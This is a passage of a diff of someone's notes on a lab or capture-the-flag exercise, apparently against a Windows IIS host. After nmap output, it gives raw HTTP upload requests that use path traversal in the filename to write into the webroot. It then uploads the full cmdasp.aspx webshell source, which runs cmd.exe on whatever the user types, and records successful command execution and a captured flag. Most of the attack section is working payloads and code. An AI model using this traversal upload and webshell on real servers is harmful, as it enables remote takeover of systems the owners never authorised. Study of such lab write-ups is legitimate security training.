 IP ID Sequence Generation: Incremental
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
-<p>Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 26.40 seconds
-           Raw packets sent: 1174 (57.962KB) | Rcvd: 1051 (44.958KB)</p>
-<h3>Possible webroot location;</h3>
-<p>C:\inetpub\wwwroot</p>
-<h3>Welp, that is webroot and it looks like we can write to arbitrary paths!!!</h3>
-<p>POST / HTTP/1.1
+           Raw packets sent: 1174 (57.962KB) | Rcvd: 1051 (44.958KB)
+
+### Possible webroot location;
+
+C:\inetpub\wwwroot
+
+### Welp, that is webroot and it looks like we can write to arbitrary paths!!!
+
+POST / HTTP/1.1
 Host: 192.168.201.192:8000
 Content-Length: 1281
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.201.192:8000">http://192.168.201.192:8000</a>
+Origin: http://192.168.201.192:8000
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxmF3qS6IUW8U3vNa
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.201.192:8000/">http://192.168.201.192:8000/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.201.192:8000/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Cookie: __AntiXsrfToken=23aa2d7d0a8d441f8e7660cc0dc5b78c
-Connection: close</p>
-<p>------WebKitFormBoundaryxmF3qS6IUW8U3vNa
-Content-Disposition: form-data; name=&quot;__EVENTTARGET&quot;</p>
-<p>------WebKitFormBoundaryxmF3qS6IUW8U3vNa
-Content-Disposition: form-data; name=&quot;__EVENTARGUMENT&quot;</p>
-<p>------WebKitFormBoundaryxmF3qS6IUW8U3vNa
-Content-Disposition: form-data; name=&quot;__VIEWSTATE&quot;</p>
-<p>/AGW6eF5yg9jsa5sKj98Ll3FM5WwG1s2AM2V5KwwgplmfL4YI5Vid9Zu6o/3WQxr3DxcBpUYxEzM3egw1smhGftCLsoZgUyB29SOC7MTiUPudZdPH6WnvVWfXsdcgNK9zXEm9Uwus4Yvvn9cc1ZLIy91q4+ytufzYvyrHALBq++NJr6lNCQgoTthmL6C45O4lO9soueiD8tk4Iy6KSQK31H7NiRP1Kprbg+Rncs4fWB/GaL+x+8q9Lp4oZJ6bSsx
+Connection: close
+
 ------WebKitFormBoundaryxmF3qS6IUW8U3vNa
-Content-Disposition: form-data; name=&quot;__VIEWSTATEGENERATOR&quot;</p>
-<p>CA0B0334
+Content-Disposition: form-data; name=&quot;__EVENTTARGET&quot;
+
+
 ------WebKitFormBoundaryxmF3qS6IUW8U3vNa
-Content-Disposition: form-data; name=&quot;__EVENTVALIDATION&quot;</p>
-<p>bac8tK3BIakQSbxCu/v2b0LHxQ5TCUiaWfB6Ak+GW9motXWRODqSWaG6K4A1+fSuQqvbOJ1oTdtnMIPVgswGYgGdWEno71XAfGMMNh6KzPUJyU96OEcsnq4mLoMOgH7g
+Content-Disposition: form-data; name=&quot;__EVENTARGUMENT&quot;
+
+
+------WebKitFormBoundaryxmF3qS6IUW8U3vNa
+Content-Disposition: form-data; name=&quot;__VIEWSTATE&quot;
+
+/AGW6eF5yg9jsa5sKj98Ll3FM5WwG1s2AM2V5KwwgplmfL4YI5Vid9Zu6o/3WQxr3DxcBpUYxEzM3egw1smhGftCLsoZgUyB29SOC7MTiUPudZdPH6WnvVWfXsdcgNK9zXEm9Uwus4Yvvn9cc1ZLIy91q4+ytufzYvyrHALBq++NJr6lNCQgoTthmL6C45O4lO9soueiD8tk4Iy6KSQK31H7NiRP1Kprbg+Rncs4fWB/GaL+x+8q9Lp4oZJ6bSsx
+------WebKitFormBoundaryxmF3qS6IUW8U3vNa
+Content-Disposition: form-data; name=&quot;__VIEWSTATEGENERATOR&quot;
+
+CA0B0334
+------WebKitFormBoundaryxmF3qS6IUW8U3vNa
+Content-Disposition: form-data; name=&quot;__EVENTVALIDATION&quot;
+
+bac8tK3BIakQSbxCu/v2b0LHxQ5TCUiaWfB6Ak+GW9motXWRODqSWaG6K4A1+fSuQqvbOJ1oTdtnMIPVgswGYgGdWEno71XAfGMMNh6KzPUJyU96OEcsnq4mLoMOgH7g
 ------WebKitFormBoundaryxmF3qS6IUW8U3vNa
 Content-Disposition: form-data; name=&quot;ctl00$MainContent$FileUploadControl&quot;; filename=&quot;../../../../../../../inetpub/wwwroot/test.txt&quot;
-Content-Type: text/plain</p>
-<p>test</p>
-<p>------WebKitFormBoundaryxmF3qS6IUW8U3vNa
-Content-Disposition: form-data; name=&quot;ctl00$MainContent$UploadButton&quot;</p>
-<p>Upload
-------WebKitFormBoundaryxmF3qS6IUW8U3vNa--</p>
-<h3>Confirmed webroot via curl;</h3>
-<p>$ curl <a href="http://192.168.201.192/test.txt">http://192.168.201.192/test.txt</a>
-test</p>
-<h3></h3>
-<h3>it appears the correct tool for this job is cmdasp.aspx</h3>
-<h3>webshell.  You can only exec an aspx from webroot.</h3>
-<h3>A few other shell asp failed, likely due to server config.</h3>
-<h3></h3>
-<p>POST / HTTP/1.1
+Content-Type: text/plain
+
+test
+
+------WebKitFormBoundaryxmF3qS6IUW8U3vNa
+Content-Disposition: form-data; name=&quot;ctl00$MainContent$UploadButton&quot;
+
+Upload
+------WebKitFormBoundaryxmF3qS6IUW8U3vNa--
+
+### Confirmed webroot via curl;
+
+$ curl http://192.168.201.192/test.txt
+test
+
+###
+### it appears the correct tool for this job is cmdasp.aspx
+### webshell.  You can only exec an aspx from webroot.
+### A few other shell asp failed, likely due to server config.
+###
+
+POST / HTTP/1.1
 Host: 192.168.200.192:8000
 Content-Length: 2766
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.200.192:8000">http://192.168.200.192:8000</a>
+Origin: http://192.168.200.192:8000
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFhfQTZYAL8cdf5pf
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.200.192:8000/">http://192.168.200.192:8000/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.200.192:8000/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Cookie: __AntiXsrfToken=2b8b41d59ff544e89dff86aaf1126550
-Connection: close</p>
-<p>------WebKitFormBoundaryFhfQTZYAL8cdf5pf
-Content-Disposition: form-data; name=&quot;__EVENTTARGET&quot;</p>
-<p>------WebKitFormBoundaryFhfQTZYAL8cdf5pf
-Content-Disposition: form-data; name=&quot;__EVENTARGUMENT&quot;</p>
-<p>------WebKitFormBoundaryFhfQTZYAL8cdf5pf
-Content-Disposition: form-data; name=&quot;__VIEWSTATE&quot;</p>
-<p>ip6bUobaXuZp0PAb/ApbSbQt2MGSX18b+6SOeCKlx2a/6ygb7DbXQTt5NSpthPy5bAMsj4OkzKo+4Zs+ySlRlpojTifonYFtX3Z2/mHVpFTGnY1lFJgew9H8jxXLYqGkDwb1FQQ+MSDO4quolZ3q+dMCBieuglkTVKixw1mm8fRtHjIz4qORPLTfRDuLeOcYfQbcyHfM6O3sIrX0qU4Tnj6oGhu9nNkZDYAyU5Q7Zlk/CVyP+1Nb7kQmfMNC5T86wWUKkbGMqe2lCJ4fr9jFf+y89RWQYxBQ22WmL64n3alWg+n2a8LAQ/BZSnXNOtzd
+Connection: close
+
 ------WebKitFormBoundaryFhfQTZYAL8cdf5pf
-Content-Disposition: form-data; name=&quot;__VIEWSTATEGENERATOR&quot;</p>
-<p>CA0B0334
+Content-Disposition: form-data; name=&quot;__EVENTTARGET&quot;
+
+
 ------WebKitFormBoundaryFhfQTZYAL8cdf5pf
-Content-Disposition: form-data; name=&quot;__EVENTVALIDATION&quot;</p>
-<p>Q3AVa4zjkt5xjyvzcQ3AB/4x8d274KYwRUVy2ihj+THMXJ5Q4hnoeYYtNTmWa3Adxk7DpqCr0CammTXYyQQVfHTZoMfSgE9TRUD8ywSBj7rlSrxcmjfki3RwEwX2VY7i
+Content-Disposition: form-data; name=&quot;__EVENTARGUMENT&quot;
+
+
+------WebKitFormBoundaryFhfQTZYAL8cdf5pf
+Content-Disposition: form-data; name=&quot;__VIEWSTATE&quot;
+
+ip6bUobaXuZp0PAb/ApbSbQt2MGSX18b+6SOeCKlx2a/6ygb7DbXQTt5NSpthPy5bAMsj4OkzKo+4Zs+ySlRlpojTifonYFtX3Z2/mHVpFTGnY1lFJgew9H8jxXLYqGkDwb1FQQ+MSDO4quolZ3q+dMCBieuglkTVKixw1mm8fRtHjIz4qORPLTfRDuLeOcYfQbcyHfM6O3sIrX0qU4Tnj6oGhu9nNkZDYAyU5Q7Zlk/CVyP+1Nb7kQmfMNC5T86wWUKkbGMqe2lCJ4fr9jFf+y89RWQYxBQ22WmL64n3alWg+n2a8LAQ/BZSnXNOtzd
+------WebKitFormBoundaryFhfQTZYAL8cdf5pf
+Content-Disposition: form-data; name=&quot;__VIEWSTATEGENERATOR&quot;
+
+CA0B0334
+------WebKitFormBoundaryFhfQTZYAL8cdf5pf
+Content-Disposition: form-data; name=&quot;__EVENTVALIDATION&quot;
+
+Q3AVa4zjkt5xjyvzcQ3AB/4x8d274KYwRUVy2ihj+THMXJ5Q4hnoeYYtNTmWa3Adxk7DpqCr0CammTXYyQQVfHTZoMfSgE9TRUD8ywSBj7rlSrxcmjfki3RwEwX2VY7i
 ------WebKitFormBoundaryFhfQTZYAL8cdf5pf
 Content-Disposition: form-data; name=&quot;ctl00$MainContent$FileUploadControl&quot;; filename=&quot;..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2Fcmdasp.aspx&quot;
-Content-Type: application/octet-stream</p>
-<p>&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;
+Content-Type: application/octet-stream
+
+&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;
 &lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;
-&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;</p>
-<script Language="c#" runat="server">
+&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;
+&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;
 void Page_Load(object sender, EventArgs e)
 {
 }
 string ExcuteCmd(string arg)
 {
 ProcessStartInfo psi = new ProcessStartInfo();
-psi.FileName = "cmd.exe";
-psi.Arguments = "/c "+arg;
+psi.FileName = &quot;cmd.exe&quot;;
+psi.Arguments = &quot;/c &quot;+arg;
 psi.RedirectStandardOutput = true;
 psi.UseShellExecute = false;
 Process p = Process.Start(psi);
@@ -2459,36 +2508,39 @@ return s;
 }
 void cmdExe_Click(object sender, System.EventArgs e)
 {
-Response.Write("<pre>");
+Response.Write(&quot;&lt;pre&gt;&quot;);
 Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
-Response.Write("</pre>");
+Response.Write(&quot;&lt;/pre&gt;&quot;);
 }
-</script>
-<HTML>
-<HEAD>
-<title>awen asp.net webshell</title>
-</HEAD>
-<body >
-<form id="cmd" method="post" runat="server">
-<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
-<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="execute" OnClick="cmdExe_Click"></asp:Button>
-<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
-</form>
-</body>
-</HTML>
+&lt;/script&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;title&gt;awen asp.net webshell&lt;/title&gt;
+&lt;/HEAD&gt;
+&lt;body &gt;
+&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;
+&lt;asp:TextBox id=&quot;txtArg&quot; style=&quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;
+&lt;asp:Button id=&quot;testing&quot; style=&quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&quot; runat=&quot;server&quot; Text=&quot;execute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;
+&lt;asp:Label id=&quot;lblText&quot; style=&quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/HTML&gt;
 
-<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
-<!--    http://michaeldaw.org   04/2007    -->
+&lt;!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) --&gt;
+&lt;!--    http://michaeldaw.org   04/2007    --&gt;
 
-<p>------WebKitFormBoundaryFhfQTZYAL8cdf5pf
-Content-Disposition: form-data; name=&quot;ctl00$MainContent$UploadButton&quot;</p>
-<p>Upload
-------WebKitFormBoundaryFhfQTZYAL8cdf5pf--</p>
-<h3>Successful cmd exec!!!</h3>
-<p>OS{0ef4f475ecc264ea3fc866354dde81be}</p>
-<pre><code>
-![Screenshot from 2023-08-30 09-10-28.png](../_resources/Screenshot%20from%202023-08-30%2009-10-28.png)
+------WebKitFormBoundaryFhfQTZYAL8cdf5pf
+Content-Disposition: form-data; name=&quot;ctl00$MainContent$UploadButton&quot;
+
+Upload
+------WebKitFormBoundaryFhfQTZYAL8cdf5pf--
+
+
+### Successful cmd exec!!!
+
+OS{0ef4f475ecc264ea3fc866354dde81be}
 </code></pre>
+<p><img src="../_resources/Screenshot%20from%202023-08-30%2009-10-28.png" alt="Screenshot from 2023-08-30 09-10-28.png"></p>
 
   </div>
 
